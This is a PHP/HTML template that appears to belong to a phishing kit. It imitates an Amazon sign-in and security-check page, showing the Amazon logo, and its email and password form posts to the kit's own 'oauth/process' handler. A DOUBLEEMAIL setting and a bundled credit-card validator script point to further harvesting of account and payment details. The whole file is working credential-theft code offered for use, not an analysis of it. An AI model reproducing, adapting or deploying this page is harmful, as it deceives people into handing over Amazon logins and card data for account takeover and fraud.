<?php
defined("ALLOW") or exit('No direct script access allowed');
$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
if (_config('DOUBLEEMAIL') == 'on') {
   $url = base_url() . "oauth/first";
} else {
   $url = base_url() . "oauth/process";
}
?>
<!DOCTYPE html>
<html>

<head>
   <title>
      <?php echo $_45 ?>
   </title>
   <meta charset="UTF-8">
   <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
   <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
   <link rel="stylesheet" href="<?= base_url() ?>Assets/_hayo/css/sign-dekstop.css">
   <link rel="stylesheet" href="<?= base_url() ?>Assets/_hayo/css/style.sign-desktop.css">
   <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/_hayo/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
   <div id="loader"></div>
   <div style="display:none;" id="myDiv" class="animate-bon ttom">
      <div id="a-page">
         <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
               <div class="a-section a-spacing-medium a-text-center">
                  <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
               </div>
            </div>
            <div id="authportal-center-section" class="a-section">
               <div class="cc-content3">
                  <div class="container">
                     <div class="row" style="padding-top: 5px">
                        <div class="col-12">
                           <div align="center"> <img src="<?= base_url() ?>Assets/fvck/images/security.png" width="80"> </div>
                           <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_45 ?></span> </div>
                           <div align="center"> <span class="lefttext" style="color: red;"><?php echo $_118 ?></span> </div><br>
                           <div class="mypayementarea">
                              <form action="<?= base_url() ?>oauth/process" method="post" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_51 ?></span>
                                 <div class="row mt-3">
                                    <div class="col-sm-6">
                                       <div class="form-group">
                                          <label for="email">
                                             <?php echo $_52 ?>
                                          </label>
                                          <input type="text" class="form-control amazoninput emailfocus" name="email" id="email" placeholder="<?php echo $_52 ?>" minlength="5" maxlength="30">
                                       </div>
                                    </div>
                                    <div class="col-sm-6">
                                       <div class="form-group">
                                          <label for="password">
                                             <?php echo $_53 ?>
                                          </label>
                                          <input type="password" id="password" class="form-control amazoninput passwordfocus" name="password" placeholder="•••••••••••••" maxlength="25">
                                       </div>
                                    </div>
                                 </div>
                                 <div class="a-row a-spacing-small">
                                    <span id="cvf-submit-otp-button" class="a-button a-button-span2 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                       <span class="a-button-inner">
                                          <button type="submit" name="Sex" class="a-button-text" role="button"><?php echo $_7 ?></button>
                                       </span>
                                    </span>
                                 </div>
                              </form>
                           </div>
                        </div>
                        <script>
                           P.when('A', 'ready').execute(function(A) {
                              var $ = A.$;
                              $('.cvf-widget-link-resend').click(function() {
                                 $('.cvf-widget-form-resend').submit();
                              });
                           });
                        </script>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="a-section a-spacing-top-extra-large auth-footer">
         <div class="a-divider a-divider-section">
            <div class="a-divider-inner"></div>
         </div>
         <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
            <a class="a-link-normal">
               <?php echo $_21 ?>
            </a> <span class="auth-footer-seperator"></span>
            <a class="a-link-normal">
               <?php echo $_22 ?>
            </a> <span class="auth-footer-seperator"></span>
            <a class="a-link-normal">
               <?php echo $_23 ?>
            </a> <span class="auth-footer-seperator"></span>
         </div>
         <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
      </div>
   </div>
   <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
   <script src="<?= base_url() ?>Assets/fvck/js/jquery.mask.min.js"></script>
   <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
   <script src="<?= base_url() ?>Assets/fvck/js/additional-methods.min.js"></script>
   <script src="<?= base_url() ?>Assets/fvck/js/jquery.creditCardValidator.js"></script>
   <script>
      let load;

      let _loader = () => {
         load = setTimeout(showPage, 1000);
      }

      let showPage = () => {
         document.getElementById('loader').style.display = 'none';
         document.getElementById('myDiv').style.display = 'block';
      }

      const alpha = (e) => {
         let k;
         document.all ? k = e.keyCode : k = e.which;
         return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
      }

      $(document).ready(function(e) {
         $("#konzform").validate({
            errorClass: "error-class",
            rules: {
               email: {
                  required: true,
                  email: true
               },
               password: {
                  required: true,
                  minlength: 3
               }
            },
            messages: {
               email: {
                  required: "<?php echo $_54 ?>"
               },
               password: {
                  required: "<?php echo $_55 ?>",
                  minlength: "<?php echo $_56 ?>"
               }
            }
         });
      })
   </script>
</body>

</html>